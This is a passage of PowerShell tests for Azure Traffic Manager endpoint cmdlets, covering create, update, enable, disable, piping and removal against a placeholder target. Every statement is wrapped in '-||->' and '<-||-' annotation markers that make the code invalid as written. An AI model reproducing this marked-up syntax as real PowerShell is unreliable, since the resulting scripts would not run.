














 -||-> function Test-AddEndpoint
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName <-||-  <-||- 

     -||-> TestSetup-AddEndpoint $endpointName $profile <-||- 

	 -||-> Assert-AreEqual 1 $profile.Endpoints.Count <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-DeleteEndpoint
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName <-||-  <-||- 

     -||-> TestSetup-AddEndpoint $endpointName $profile <-||- 

	 -||-> Remove-AzTrafficManagerEndpointConfig -EndpointName $endpointName -TrafficManagerProfile $profile <-||- 

	 -||-> Assert-AreEqual 0 $profile.Endpoints.Count <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-EndpointCrud
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName <-||-  <-||- 

	 -||-> $endpoint =  -||-> New-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName  -Type "ExternalEndpoints" -Target "www.contoso.com" -EndpointStatus "Enabled" -EndpointLocation "North Europe" <-||-  <-||- 

	 -||-> Assert-NotNull $endpoint <-||- 
	 -||-> Assert-AreEqual $endpointName $endpoint.Name <-||-  
	 -||-> Assert-AreEqual $profileName $endpoint.ProfileName <-||-  
	 -||-> Assert-AreEqual $resourceGroup.ResourceGroupName $endpoint.ResourceGroupName <-||-  
	 -||-> Assert-AreEqual "ExternalEndpoints" $endpoint.Type <-||- 
	 -||-> Assert-AreEqual "www.contoso.com" $endpoint.Target <-||- 
	 -||-> Assert-AreEqual "Enabled" $endpoint.EndpointStatus <-||- 
	

     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName  -Type "ExternalEndpoints" <-||-  <-||- 

	 -||-> Assert-NotNull $endpoint <-||- 
	 -||-> Assert-AreEqual $endpointName $endpoint.Name <-||-  
	 -||-> Assert-AreEqual $profileName $endpoint.ProfileName <-||-  
	 -||-> Assert-AreEqual $resourceGroup.ResourceGroupName $endpoint.ResourceGroupName <-||-  
	 -||-> Assert-AreEqual "ExternalEndpoints" $endpoint.Type <-||- 
	 -||-> Assert-AreEqual "www.contoso.com" $endpoint.Target <-||- 
	 -||-> Assert-AreEqual "Enabled" $endpoint.EndpointStatus <-||- 
	

     -||-> $endpoint.EndpointStatus = "Disabled" <-||- 

     -||-> $endpoint =  -||-> Set-AzTrafficManagerEndpoint -TrafficManagerEndpoint $endpoint <-||-  <-||- 

     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName  -Type "ExternalEndpoints" <-||-  <-||- 

	 -||-> Assert-NotNull $endpoint <-||- 
	 -||-> Assert-AreEqual $endpointName $endpoint.Name <-||-  
	 -||-> Assert-AreEqual $profileName $endpoint.ProfileName <-||-  
	 -||-> Assert-AreEqual $resourceGroup.ResourceGroupName $endpoint.ResourceGroupName <-||-  
	 -||-> Assert-AreEqual "ExternalEndpoints" $endpoint.Type <-||- 
	 -||-> Assert-AreEqual "www.contoso.com" $endpoint.Target <-||- 
	 -||-> Assert-AreEqual "Disabled" $endpoint.EndpointStatus <-||- 
	

	 -||-> $removed =  -||-> Remove-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" -Force <-||-  <-||- 

     -||-> Assert-True {  -||-> $removed <-||-  } <-||- 

     -||-> Assert-Throws {  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  } <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-EndpointCrudGeo
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName "Geographic" <-||-  <-||- 

	 -||-> $endpoint =  -||-> New-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName  -Type "ExternalEndpoints" -Target "www.contoso.com" -EndpointStatus "Enabled" -GeoMapping "GEO-NA","GEO-SA" <-||-  <-||- 

	 -||-> Assert-NotNull $endpoint <-||- 
	 -||-> Assert-AreEqual $endpointName $endpoint.Name <-||-  
	 -||-> Assert-AreEqual $profileName $endpoint.ProfileName <-||-  
	 -||-> Assert-AreEqual $resourceGroup.ResourceGroupName $endpoint.ResourceGroupName <-||-  
	 -||-> Assert-AreEqual "ExternalEndpoints" $endpoint.Type <-||- 
	 -||-> Assert-AreEqual "www.contoso.com" $endpoint.Target <-||- 
	 -||-> Assert-AreEqual "Enabled" $endpoint.EndpointStatus <-||- 
	 -||-> Assert-AreEqual "GEO-NA" $endpoint.GeoMapping[0] <-||- ;
	 -||-> Assert-AreEqual "GEO-SA" $endpoint.GeoMapping[1] <-||- ;

     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName  -Type "ExternalEndpoints" <-||-  <-||- 

	 -||-> Assert-NotNull $endpoint <-||- 
	 -||-> Assert-AreEqual $endpointName $endpoint.Name <-||-  
	 -||-> Assert-AreEqual $profileName $endpoint.ProfileName <-||-  
	 -||-> Assert-AreEqual $resourceGroup.ResourceGroupName $endpoint.ResourceGroupName <-||-  
	 -||-> Assert-AreEqual "ExternalEndpoints" $endpoint.Type <-||- 
	 -||-> Assert-AreEqual "www.contoso.com" $endpoint.Target <-||- 
	 -||-> Assert-AreEqual "Enabled" $endpoint.EndpointStatus <-||- 
	 -||-> Assert-AreEqual "GEO-NA" $endpoint.GeoMapping[0] <-||- ;
	 -||-> Assert-AreEqual "GEO-SA" $endpoint.GeoMapping[1] <-||- ;

     -||-> $endpoint.GeoMapping.Add("GEO-AP") <-||- ;

     -||-> $endpoint =  -||-> Set-AzTrafficManagerEndpoint -TrafficManagerEndpoint $endpoint <-||-  <-||- 

     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName  -Type "ExternalEndpoints" <-||-  <-||- 

	 -||-> Assert-NotNull $endpoint <-||- 
	 -||-> Assert-AreEqual $endpointName $endpoint.Name <-||-  
	 -||-> Assert-AreEqual $profileName $endpoint.ProfileName <-||-  
	 -||-> Assert-AreEqual $resourceGroup.ResourceGroupName $endpoint.ResourceGroupName <-||-  
	 -||-> Assert-AreEqual "ExternalEndpoints" $endpoint.Type <-||- 
	 -||-> Assert-AreEqual "www.contoso.com" $endpoint.Target <-||- 
	 -||-> Assert-AreEqual "Enabled" $endpoint.EndpointStatus <-||- 
	 -||-> Assert-AreEqual "GEO-NA" $endpoint.GeoMapping[0] <-||- ;
	 -||-> Assert-AreEqual "GEO-SA" $endpoint.GeoMapping[1] <-||- ;
	 -||-> Assert-AreEqual "GEO-AP" $endpoint.GeoMapping[2] <-||- ;

	 -||-> $removed =  -||-> Remove-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" -Force <-||-  <-||- 

     -||-> Assert-True {  -||-> $removed <-||-  } <-||- 

     -||-> Assert-Throws {  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  } <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-EndpointCrudPiping
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName <-||-  <-||- 

	 -||-> $endpoint =  -||-> New-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName  -Type "ExternalEndpoints" -Target "www.contoso.com" -EndpointStatus "Enabled" -EndpointLocation "North Europe" <-||-  <-||- 

	 -||-> Assert-NotNull $endpoint <-||- 
	 -||-> Assert-AreEqual $endpointName $endpoint.Name <-||-  
	 -||-> Assert-AreEqual $profileName $endpoint.ProfileName <-||-  
	 -||-> Assert-AreEqual $resourceGroup.ResourceGroupName $endpoint.ResourceGroupName <-||-  
	 -||-> Assert-AreEqual "ExternalEndpoints" $endpoint.Type <-||- 
	 -||-> Assert-AreEqual "www.contoso.com" $endpoint.Target <-||- 
	 -||-> Assert-AreEqual "Enabled" $endpoint.EndpointStatus <-||- 
	

     -||-> $removed =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName  -Type "ExternalEndpoints" | Set-AzTrafficManagerEndpoint | Remove-AzTrafficManagerEndpoint -Force <-||-  <-||- 

     -||-> Assert-True {  -||-> $removed <-||-  } <-||- 

     -||-> Assert-Throws {  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  } <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-CreateExistingEndpoint
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName <-||-  <-||- 

	 -||-> $endpoint =  -||-> New-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName  -Type "ExternalEndpoints" -Target "www.contoso.com" -EndpointStatus "Enabled" -EndpointLocation "North Europe" <-||-  <-||- 

     -||-> Assert-Throws {  -||-> New-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName  -Type "ExternalEndpoints" -Target "www.contoso.com" -EndpointStatus "Enabled" -EndpointLocation "North Europe" <-||-  } <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-CreateExistingEndpointFromNonExistingProfile
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

     -||-> try
	{
	 -||-> Assert-Throws {  -||-> New-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" -Target "www.contoso.com" -EndpointStatus "Enabled" -EndpointLocation "North Europe" <-||-  } <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-RemoveExistingEndpointFromNonExistingProfile
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

     -||-> try
	{
	 -||-> Assert-Throws {  -||-> Remove-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  } <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-GetExistingEndpointFromNonExistingProfile
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

     -||-> try
	{
	 -||-> Assert-Throws {  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  } <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-RemoveNonExistingEndpointFromProfile
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

     -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName <-||-  <-||- 

     -||-> Assert-Throws {  -||-> Remove-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  } <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-EnableEndpoint
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName "Weighted" <-||-  <-||- 

	 -||-> $endpoint =  -||-> New-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" -Target "www.contoso.com" -EndpointStatus "Disabled" -EndpointLocation "North Europe" <-||-  <-||- 

	 -||-> Assert-AreEqual "Disabled" $endpoint.EndpointStatus <-||- 

     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  <-||- 

	 -||-> Assert-True {  -||-> Enable-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  } <-||- 

     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  <-||- 

	 -||-> Assert-AreEqual "Enabled" $endpoint.EndpointStatus <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-DisableEndpoint
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName "Weighted" <-||-  <-||- 

	 -||-> $endpoint =  -||-> New-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" -Target "www.contoso.com" -EndpointStatus "Enabled" -EndpointLocation "North Europe" <-||-  <-||- 

	 -||-> Assert-AreEqual "Enabled" $endpoint.EndpointStatus <-||- 

     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  <-||- 

	 -||-> Assert-True {  -||-> Disable-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" -Force <-||-  } <-||- 

     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  <-||- 

	 -||-> Assert-NotNull $endpoint <-||- 
	 -||-> Assert-AreEqual "Disabled" $endpoint.EndpointStatus <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-EnableEndpointUsingPiping
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName "Weighted" <-||-  <-||- 

	 -||-> $endpoint =  -||-> New-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" -Target "www.contoso.com" -EndpointStatus "Disabled" -EndpointLocation "North Europe" <-||-  <-||- 

	 -||-> Assert-AreEqual "Disabled" $endpoint.EndpointStatus <-||- 

     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  <-||- 

	 -||-> Assert-True {  -||-> Enable-AzTrafficManagerEndpoint -TrafficManagerEndpoint $endpoint <-||-  } <-||- 

     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  <-||- 

	 -||-> Assert-AreEqual "Enabled" $endpoint.EndpointStatus <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-EnableEndpointUsingPipingFromGetProfile
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName "Weighted" <-||-  <-||- 

	 -||-> $endpoint =  -||-> New-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" -Target "www.contoso.com" -EndpointStatus "Disabled" -EndpointLocation "North Europe" <-||-  <-||- 

	 -||-> Assert-AreEqual "Disabled" $endpoint.EndpointStatus <-||- 

     -||-> $retrievedProfile =  -||-> Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName <-||-  <-||- 
	
	 -||-> Assert-True {  -||-> Enable-AzTrafficManagerEndpoint -TrafficManagerEndpoint $retrievedProfile.Endpoints[0] <-||-  } <-||- 

     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  <-||- 

	 -||-> Assert-AreEqual "Enabled" $endpoint.EndpointStatus <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-DisableEndpointUsingPiping
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName "Weighted" <-||-  <-||- 

	 -||-> $endpoint =  -||-> New-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" -Target "www.contoso.com" -EndpointStatus "Enabled" -EndpointLocation "North Europe" <-||-  <-||- 

	 -||-> Assert-AreEqual "Enabled" $endpoint.EndpointStatus <-||- 

     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  <-||- 

	 -||-> Assert-True {  -||-> Disable-AzTrafficManagerEndpoint -TrafficManagerEndpoint $endpoint -Force <-||-  } <-||- 

     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  <-||- 

	 -||-> Assert-NotNull $endpoint <-||- 
	 -||-> Assert-AreEqual "Disabled" $endpoint.EndpointStatus <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-EnableNonExistingEndpoint
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName <-||-  <-||- 

	 -||-> Assert-Throws {  -||-> Enable-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  } <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-DisableNonExistingEndpoint
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName <-||-  <-||- 

	 -||-> Assert-Throws {  -||-> Disable-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  } <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-EndpointTypeCaseInsensitive
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName "Priority" <-||-  <-||- 

	 -||-> $type = "exTernalendpoInTS" <-||- 
	 -||-> $endpoint =  -||-> New-AzTrafficManagerEndpoint -Type $type -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Target "www.contoso.com" -EndpointStatus "Enabled" -EndpointLocation "North Europe" <-||-  <-||- 
	 -||-> $type = "ExTernalendpoInTS" <-||- 
	 -||-> Assert-True {  -||-> Disable-AzTrafficManagerEndpoint -Type $type -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Force <-||-  } <-||- 
	 -||-> $type = "EXTernalendpoInTS" <-||- 
	 -||-> Assert-True {  -||-> Enable-AzTrafficManagerEndpoint -Type $type -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName <-||-  } <-||- 
	 -||-> $type = "EXTErnalendpoInTS" <-||- 
     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Type $type -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName <-||-  <-||- 
	 -||-> $type = "EXTERnalendpoInTS" <-||- 
	 -||-> $endpoint | Set-AzTrafficManagerEndpoint <-||- 
	 -||-> $type = "EXTERNalendpoInTS" <-||- 
	 -||-> Remove-AzTrafficManagerEndpoint -Type $type -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Force <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-PipeEndpointFromGetEndpoint
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName "Priority" <-||-  <-||- 

	 -||-> $type = "EXternalendpointS" <-||- 
	 -||-> New-AzTrafficManagerEndpoint -Type $type -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Target "www.contoso.com" -EndpointStatus "Enabled" -EndpointLocation "North Europe" <-||- 
	 -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Type $type -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName <-||-  <-||- 

	 -||-> Assert-True {  -||-> Disable-AzTrafficManagerEndpoint -TrafficManagerEndpoint $endpoint -Force <-||-  } <-||- 
	 -||-> Assert-True {  -||-> Enable-AzTrafficManagerEndpoint -TrafficManagerEndpoint $endpoint <-||-  } <-||- 
    
	 -||-> Set-AzTrafficManagerEndpoint -TrafficManagerEndpoint $endpoint <-||- 
	 -||-> Remove-AzTrafficManagerEndpoint -TrafficManagerEndpoint $endpoint -Force <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 



 -||-> function Test-PipeEndpointFromGetProfile
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName "Priority" <-||-  <-||- 

	 -||-> $type = "exterNAleNdpOints" <-||- 
	 -||-> New-AzTrafficManagerEndpoint -Type $type -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Target "www.contoso.com" -EndpointStatus "Enabled" -EndpointLocation "North Europe" <-||- 
	 -||-> $profile =  -||-> Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName <-||-  <-||- 
	 -||-> $endpoint = $profile.Endpoints[0] <-||- 
	
	 -||-> Assert-True {  -||-> Disable-AzTrafficManagerEndpoint -TrafficManagerEndpoint $endpoint -Force <-||-  } <-||- 
	 -||-> Assert-True {  -||-> Enable-AzTrafficManagerEndpoint -TrafficManagerEndpoint $endpoint <-||-  } <-||- 
    
	 -||-> Set-AzTrafficManagerEndpoint -TrafficManagerEndpoint $endpoint <-||- 
	 -||-> Remove-AzTrafficManagerEndpoint -TrafficManagerEndpoint $endpoint -Force <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-AddAndRemoveCustomHeadersFromEndpoint
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName "Weighted" <-||-  <-||- 

